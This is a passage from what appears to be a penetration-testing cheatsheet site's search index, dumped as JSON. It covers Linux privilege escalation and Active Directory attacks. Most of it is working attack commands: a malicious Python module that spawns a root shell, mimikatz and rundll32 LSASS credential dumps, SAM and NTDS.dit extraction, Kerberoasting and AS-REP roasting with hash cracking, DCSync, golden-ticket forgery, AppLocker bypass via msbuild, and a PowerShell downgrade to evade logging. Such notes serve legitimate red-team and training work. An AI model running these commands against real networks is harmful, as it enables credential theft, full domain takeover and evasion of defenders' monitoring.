<pre><code>echo \"/home/user/mylibs\" &gt; /etc/ld.so.conf.d/malicious.conf\nldconfig\n</code></pre></li> <li>Place your <code>.so</code> in <code>/home/user/mylibs</code> and run the vulnerable binary.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Shared%20Libraries%20%26%20Interpreter%20Hijacking/#python-module-hijacking","title":"Python Module Hijacking","text":"<ol> <li>Locate SUID Python Scripts <pre><code>find / -perm -4000 -type f | grep \"\\.py$\" 2&gt;/dev/null\n</code></pre></li> <li>Create malicious python module <pre><code>mkdir -p /tmp/malicious\ncat &lt;&lt; 'EOF' &gt; /tmp/malicious/pickle.py\nimport os\nos.setuid(0)\nos.system(\"/bin/sh\")\nEOF\n</code></pre></li> <li>Set PYTHONPATH and Run the Script <pre><code>export PYTHONPATH=/tmp/malicious:$PYTHONPATH\n/usr/bin/vulnerable_suid_script.py\n</code></pre></li> <li>If <code>vulnerable_suid_script.py</code> does <code>import pickle</code> (or another module you control), it spawns a root shell.</li> </ol>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Writable%20Directories/","title":"Writable Directories","text":"<p>Find World-Writable Directories <pre><code>find / -type d -perm -002 -ls 2&gt;/dev/null\n</code></pre> Find World-Writable Files <pre><code>find / -type f -perm -002 -ls 2&gt;/dev/null\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/ASREPRoast/","title":"ASREPRoast","text":"","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/ASREPRoast/#identify","title":"Identify","text":"<p>NXC (remotely) <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --query '(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \"\"\n</code></pre> Locally: ADSearch Github <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=user)(servicePrincipalName=*))\" --attributes cn,servicePrincipalName,samAccountName\n</code></pre> Locally: lolbin <pre><code>dsquery * -filter \"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))\" -attr distinguishedName userAccountControl\n</code></pre> Locally: powerview <pre><code>Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontro\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/ASREPRoast/#exploit","title":"Exploit","text":"<p>Ask for TGS  remotely: <pre><code>nxc ldap &lt;IP&gt; -u '&lt;USER&gt;' -p '' --asreproast output.txt\n</code></pre> <pre><code>impacket-GetNPUsers domain.local/svc-test -no-pass\n</code></pre> locally: <pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap\n</code></pre> <pre><code>Get-ASREPHash -Username svc-test -verbose\n</code></pre></p> <p>Crack ticket <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> <pre><code>john --wordlist=&lt;wordlist&gt; hashes.txt\n</code></pre></p>","tags":["Initial-Access","Kerberos","Unauthenticated","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/","title":"Credential Dumping","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#locally","title":"Locally","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#mimikatz","title":"Mimikatz","text":"<p>Dump all <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit\n</code></pre> Output to file with log <pre><code>.\\mimikatz.exe \"log C:\\path\\to\\mimikatz.log\" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"log\" \"exit\"\n</code></pre> Output to file with redirection <pre><code>.\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit &gt; C:\\path\\to\\mimi-output.txt\n</code></pre> Dump SAM (Local passwords) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::sam /patchlsadsu\" exit\n</code></pre> Dump LSA (DC) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /patch\" exit\n</code></pre> Target krbtgt (for golden ticket generation) <pre><code>.\\mimikatz.exe \"privilege::debug\" \"lsadump::lsa /inject /name:krbtgt\" exit\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#rubeus","title":"Rubeus","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#kerberos-tickets","title":"Kerberos Tickets","text":"<p>List cached tickets - Non elevated: List current users - Elevated: List everyones <pre><code>Rubeus.exe triage\n</code></pre> Specify service <pre><code>Rubeus.exe triage /service:ldap\n</code></pre> Dump tickets - Non elevated: dump current users <pre><code>Rubeus.exe dump\n</code></pre> Dump all tickets by targeting krbtgt (Elevated) <pre><code>Rubeus.exe dump /service:krbtgt\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#alternative-methods","title":"Alternative Methods","text":"<p>Save SAM and SYSTEM/SECURITY, extract locally</p> <p>note</p> <p>we will only need hklm\\sam &amp; hklm\\system, but hklm\\security can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts</p> <p><pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre> Dump locally <pre><code>impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre> Dump lsass with task manager</p> <p>GUI access required</p> <p><code>Open Task Manager</code> &gt; <code>Select the Processes tab</code> &gt; <code>Find &amp; right click the Local Security Authority Process</code> &gt; <code>Select Create dump file</code> **A file called <code>lsass.DMP</code> is created and saved in:</p> <pre><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp\n</code></pre> <p>Rundll32.exe &amp; Comsvcs.dll Method</p> <p>Will absolutely be flagged by AV/EDR</p> <p>Get lsass PID <pre><code>tasklist /svc\n</code></pre> <pre><code>Get-Process lsass\n</code></pre> Create dumpfile with rundll32 <pre><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full\n</code></pre></p> <p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\\lsass.dmp</code>).</p> <p>Use Pypykatz to Extract Credentials (on attack box) <pre><code>pypykatz lsa minidump lsass.dmp \n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#ntdsdit-dumping","title":"NTDS.dit Dumping","text":"<p>(Need DA or local admin on DC) Shadow Copy <pre><code>vssadmin CREATE SHADOW /For=C:\n</code></pre> Copying NTDS.dit from the VSS <pre><code>cmd.exe /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\NTDS.dit c:\\NTDS\\NTDS.dit\n</code></pre> Dump locally <pre><code>impacket-secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#remotely","title":"Remotely","text":"","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#netexec","title":"netexec","text":"<p>LSA (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --lsa\n</code></pre> SAM (local admin required) <pre><code>nxc smb 10.129.42.198 -u '' -p '' --local-auth --sam\n</code></pre> NTDS (DA or local admin on DC required) <pre><code>nxc smb 10.129.201.57 -u '' -p '' --ntds\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Dumping/#impacket","title":"impacket","text":"<p>Dump everything (local admin required) <pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'IP' -dc-ip &lt;DCIP&gt;\n</code></pre></p>","tags":["Authenticated","Elevated","Impacket","Kerberos","LSASS","Lateral-Movement","Mimikatz","Privilege-Escalation","Rubeus","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/","title":"Credential Hunting","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/#lazagne","title":"LaZagne","text":"<p>https://github.com/AlessandroZ/LaZagne Hunt for passwords stored in commonly used software. All modules <pre><code>laZagne.exe all\nlaZagne.exe all -output C:\\Windows\\Tasks\n</code></pre> Decrypt domain creds (requires current users password) <pre><code>laZagne.exe all -password &lt;PASS&gt;\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/#snaffler","title":"Snaffler","text":"<p>https://github.com/SnaffCon/Snaffler Will spider shares and readable directories for common credential patterns <pre><code>Snaffler.exe -s -d domain.local -o snaffler.log -v data\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/#seatbelt","title":"Seatbelt","text":"<p>https://github.com/GhostPack/Seatbelt performs security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. Sometimes finding creds. <pre><code>Seatbelt.exe -group=all -outputfile=\"C:\\Windows\\Tasks\\all.txt\"\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Credential%20Hunting/#manual-approach","title":"Manual Approach","text":"<p><pre><code>findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre> places we should keep in mind when credential hunting:</p> <ul> <li>Passwords in Group Policy in the SYSVOL share</li> <li>Passwords in scripts in the SYSVOL share</li> <li>Password in scripts on IT shares</li> <li>Passwords in web.config files on dev machines and IT shares</li> <li>unattend.xml</li> <li>Passwords in the AD user or computer description fields</li> <li>KeePass databases --&gt; pull hash, crack and get loads of access.</li> <li>Found on user systems and shares</li> <li>Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint</li> </ul>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Hash%20Cracking/","title":"Hash Cracking","text":"<p>NTLM <pre><code>hashcat -m 1000 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> NetNTLMv2 <pre><code>hashcat -m 5600 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> AS-REP (Kerberos 5 AS-REP etype 23) <pre><code>hashcat -m 18200 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre> Kerberoasted SPN (Kerberos 5 TGS-REP) <pre><code>hashcat -m 13100 --force -a 0 hashes.txt &lt;wordlist&gt;\n</code></pre></p>","tags":["Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/","title":"Kerberoasting","text":"","tags":["Authenticated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/#identify","title":"Identify","text":"<p>Windows AD Module in powershell <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre> Using Powerview <pre><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName\n</code></pre> Living off the land <pre><code>setspn.exe -Q */*\n</code></pre> Using Rubeus <pre><code>.\\Rubeus.exe kerberoast /stats\n</code></pre> Linux <pre><code>impacket-GetUserSPNs -dc-ip &lt;dcip&gt; domain.local/username\n</code></pre> <pre><code>ldapsearch -x -b \"DC=certified,DC=htb\" -s sub \"(&amp;(objectClass=user)(servicePrincipalName=*))\" -H ldap://10.129.229.25 | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre></p>","tags":["Authenticated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Access%20%26%20Harvesting/Kerberoasting/#exploit","title":"Exploit","text":"<p>Make sure you're time is synced with remote host <pre><code>sudo timedatectl set-ntp off\nsudo rdate -n &lt;targetDC&gt;\n</code></pre> From Linux <pre><code>impacket-GetUserSPNs -dc-ip &lt;dcip&gt; domain.local/username -request\n</code></pre> <pre><code>impacket-GetUserSPNs -dc-ip &lt;dcip&gt; domain.local/username -request-user\n</code></pre> you can also use <code>-outputfile &lt;name&gt;</code> <pre><code>nxc ldap &lt;IP&gt; -u 'user' -p '' --kerberoasting &lt;OUTFILE&gt;\n</code></pre></p> <p>Crack hash <pre><code>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre> From Windows - Semi-manual approach </p> <pre><code>setspn.exe -Q */*\n</code></pre> <pre><code>Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/DEV-PRE-SQL.domain.local:1433\"\n</code></pre> <pre><code>mimikatz # base64 /out:true\nmimikatz # kerberos::list /export  \n</code></pre> <pre><code>echo \"&lt;base64 blob&gt;\" |  tr -d \\\\n \n</code></pre> <pre><code>cat encoded_file | base64 -d &gt; sqldev.kirbi\n</code></pre> <pre><code>python2.7 kirbi2john.py sqldev.kirbi\n</code></pre> <p>This will create a file called <code>crack_file</code>. We then must modify the file a bit to be able to use Hashcat against the hash.</p> <pre><code>sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file &gt; sqldev_tgs_hashcat\n</code></pre> <p>Crack the file</p> <pre><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt \n</code></pre> <p>note</p> <p>If we decide to skip the base64 output with Mimikatz and type <code>mimikatz # kerberos::list /export</code>, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run <code>kirbi2john.py</code> against them directly, skipping the base64 decoding step.</p> <p>PowerView <pre><code>Import-Module .\\PowerView.ps1\nGet-DomainUser * -spn | select samaccountname\n</code></pre> <pre><code>Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n</code></pre> <pre><code>Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n</code></pre> Rubeus List info about kerberoastable accounts <pre><code>.\\Rubeus.exe kerberoast /stats\n</code></pre> target admin acccounts <pre><code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap\n</code></pre> use tgt delegation to force RC4 downgrade of tickets. (Doesn't work on &gt;= Win 2019) <pre><code>.\\Rubeus.exe kerberoast /tgtdeleg /nowrap\n</code></pre></p>","tags":["Authenticated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCSync/","title":"DCSync","text":"","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCSync/#identify","title":"Identify","text":"<p>Do you control an object with the <code>DS-Replication-Get-Changes</code> ACL?</p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/DCSync/#exploit","title":"Exploit","text":"<p><pre><code>impacket-secretsdump 'domain.local'/'&lt;user&gt;':'&lt;pass&gt;'@'&lt;DC0IP&gt;'\n</code></pre> From windows <pre><code>runas /netonly /user:DOMAIN\\user powershell\n</code></pre> <pre><code>.\\mimikatz.exe\nprivilege::debug\nlsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\\administrator\n</code></pre></p>","tags":["Authenticated","DS-Replication-Get-Changes","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Diamond%20Ticket/","title":"Diamond Ticket","text":"<p>Similar to a golden ticket in function but not in form. Instead of forging a new ticket, a diamond ticket is created by modifying fields of a previously granted ticket. This gives some opsec advantages because:</p> <ul> <li>TGS-REQ will have a AS-REQ preceding it.</li> <li>It will have all the correct details from the domain's Kerberos policy because it was issued by the DC</li> </ul>","tags":["Authenticated","Kerberos","OPSEC","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/","title":"Golden Ticket","text":"<p>forge a Kerberos Ticket Granting Ticket (TGT) with a domain's KRBTGT account hash, allowing an attacker to impersonate any user including domain admins without needing their credentials.</p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/#get-domain-sid","title":"Get domain SID","text":"<p>locally: <pre><code>(Get-ADDomain).DomainSID\n</code></pre> <pre><code>whoami /user # (domain SID is the part before the last hyphen (RID).)\n</code></pre> remotely: <pre><code>nxc ldap &lt;target&gt; -u &lt;user&gt; -p &lt;pass&gt; --sid\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/#get-krbtgt-account-hash","title":"Get krbtgt account hash","text":"<p>locally - mimikatz <pre><code>lsadump::lsa /inject /name:krbtgt\n</code></pre> remotely - nxc <pre><code>nxc smb &gt;ip&gt; --local-auth -u '' -p '' --lsa --user krbtgt\nnxc smb &lt;dcip&gt; --local-auth -u '' -p '' --ntds --user krbtgt\n</code></pre> remotely - secretsdump <pre><code>impacket-secretsdump user:pass@10.0.0.35\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Credential%20Forgery%20%26%20Abuse/Golden%20Ticket/#generate-ticket","title":"Generate ticket","text":"<p>with mimikatz <pre><code>kerberos::golden /User:Administrator /domain:domain.local /sid:&lt;SID&gt; /krbtgt:&lt;krbtgt hash&gt; /id:500 /ptt\n</code></pre> spawn shell with ticket <pre><code>misc::cmd\n</code></pre> Now we can use psexec for a shell anywhere <pre><code>psexec.exe  -accepteula \\\\hostname cmd.exe\n</code></pre> With impacket <pre><code>impacket-ticketer -nthash &lt;krbtgt_ntlm_hash&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n# OR with aes\npython ticketer.py -aesKey &lt;aes_key&gt; -domain-sid &lt;domain_sid&gt; -domain &lt;domain_name&gt;  &lt;user_name&gt;\n</code></pre> set ticket env var <pre><code>export KRB5CCNAME=&lt;TGS_ccache_file&gt;\n</code></pre> Then you can access anything <pre><code>impacket-psexec &lt;domain_name&gt;/&lt;user_name&gt;@&lt;remote_hostname&gt; -k -no-pass\n</code></pre></p>","tags":["Authenticated","Kerberos","Persistence","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/","title":"Enumerating Security Controls","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#identify","title":"Identify","text":"","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#windows-defender","title":"Windows Defender","text":"<p><pre><code>Get-MpComputerStatus\n</code></pre> If RealTimeProtection: True, we have defender enabled</p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#applocker","title":"AppLocker","text":"<pre><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n</code></pre>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#bypassing-policy-with-lolbas","title":"Bypassing Policy with LOLBAS","text":"<p>They exist in trusted paths (C:\\Windows and C:\\Program Files) and may also be digitally signed by Microsoft.  Examples: https://lolbas-project.github.io/ Example: msbuild.exe Build and execute a C# project stored in the target XML file:</p> helloworld.xml <pre><code>&lt;Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"&gt;\n  &lt;Target Name=\"MSBuild\"&gt;\n   &lt;MSBuildTest/&gt;\n  &lt;/Target&gt;\n   &lt;UsingTask\n    TaskName=\"MSBuildTest\"\n    TaskFactory=\"CodeTaskFactory\"\n    AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" &gt;\n     &lt;Task&gt;\n      &lt;Code Type=\"Class\" Language=\"cs\"&gt;\n        &lt;![CDATA[\n\n            using System;\n            using Microsoft.Build.Framework;\n            using Microsoft.Build.Utilities;\n\n            public class MSBuildTest : Task, ITask\n            {\n                public override bool Execute()\n                {\n                    Console.WriteLine(\"Hello World\");\n                    return true;\n                }\n            }\n\n        ]]&gt;\n      &lt;/Code&gt;\n    &lt;/Task&gt;\n  &lt;/UsingTask&gt;\n&lt;/Project&gt;\n</code></pre> <pre><code>msbuild.exe helloworld.xml\n</code></pre> <p>note</p> <p>Organizations often block the <code>PowerShell.exe</code> executable, but forget about the other PowerShell executable locations such as <code>%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe</code> or <code>PowerShell_ISE.exe</code></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#powershell-constrained-language-mode","title":"PowerShell Constrained Language Mode","text":"<p>Will prevent tons of useful powershell features <pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Enumerating%20Security%20Controls/#laps","title":"LAPS","text":"<p>https://github.com/leoloobeek/LAPSToolkit Can help us find ADUsers that have permissions to read LAPS passwords <pre><code>Find-LAPSDelegatedGroups\n</code></pre> The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with \"All Extended Rights.\" Users with \"All Extended Rights\" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for. <pre><code>Find-AdmPwdExtendedRights\n</code></pre> Find computers with laps enabled <pre><code>Get-LAPSComputers\n</code></pre></p>","tags":["Authenticated","OPSEC","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Defense%20Evasion/Powershell%20Downgrade/","title":"Powershell Downgrade","text":"<p>Powershell event logging was introduced as a feature with Powershell 3.0 and forward. We can attempt to enable Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. <pre><code>powershell.exe -version 2\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/","title":"Domain User Enumeration","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/#remote","title":"Remote","text":"<p>Multi-Protocol <pre><code>enum4linux -a &lt;IP&gt;\n</code></pre> SMB <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --users\n</code></pre> RPC <pre><code>rpcclient -U \"\" -N &lt;IP&gt;\nenumdomusers\n</code></pre> <pre><code>queryuser 0x457 &lt;---user RID\n</code></pre> ldap <pre><code>ldapsearch -x -b \"DC=HTB,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\" -H ldap://&lt;IP&gt; | grep -i samaccountname: | cut -f 2 -d \" \"\n</code></pre> <pre><code>nxc ldap &lt;IP&gt; -u '' -p '' --users    \n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p 'pass' --da\n</code></pre> <pre><code>python3 windapsearch.py --dc-ip &lt;dcip&gt; -u user@domain -p &lt;pass&gt; -PU\n</code></pre> Check logged in users <pre><code>nxc smb &lt;IP&gt; -u '' -p '' --loggedon-users\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/#brute-force-usernames","title":"Brute force usernames","text":"<pre><code>kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175\n</code></pre>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/#generate-userlists","title":"Generate userlists","text":"<p>Username Anarchy <pre><code>sudo apt install ruby -y\ngit clone https://github.com/urbanadventurer/username-anarchy.git\ncd username-anarchy\n</code></pre> <pre><code>./username-anarchy Jane Smith &gt; jane_smith_usernames.txt\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20User%20Enumeration/#validate-known-usernames","title":"Validate Known Usernames","text":"<pre><code>kerberute userenum -d &lt;DOMAIN&gt; users.txt\n</code></pre> <p>Add a known negative user to make sure the server is properly validating.</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/","title":"Domain Wide Enumeration","text":"","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/#bloodhound","title":"Bloodhound","text":"<p>Remote ingestion <pre><code>nxc ldap &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --bloodhound --collection All --dns-server &lt;DC-IP&gt;\n</code></pre> <pre><code>bloodhound-python -c All -u &lt;user&gt; -p &lt;pass&gt; -d domain.local -ns &lt;dc-ip&gt;\n</code></pre> <pre><code>sudo bloodhound-python -u 'user' -p 'pass' -ns &lt;dc-ip&gt; -d domain.local -c all \n</code></pre></p> <p>Local Ingestion <pre><code>SharpHound.exe --CollectionMethods All\n</code></pre> <pre><code>Invoke-BloodHound -CollectionMethod All\n</code></pre> cypher queries</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/#powerviewpy-remote","title":"powerview.py (remote)","text":"<p>https://github.com/aniqfakhrul/powerview.py</p> <p>Run powerview functions remotely over a persistent ldap bind.</p> <p>CLI: <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --dc-ip 192.168.86.192 \n</code></pre> Web &amp; Cli <pre><code>powerview range.net/lowpriv:Password123@192.168.86.192 --web --web-host 0.0.0.0 --web-port 3000 --web-auth user:password1234\n</code></pre></p>","tags":["Authenticated","Bloodhound","DACL","PingCastle","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Discovery%20%26%20Reconnaissance/Domain%20Wide%20Enumeration/#powerviewsharpview-local","title":"PowerView/Sharpview (local)","text":"<p>https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</p> Command Description <code>Export-PowerViewCSV</code> Append results to a CSV file 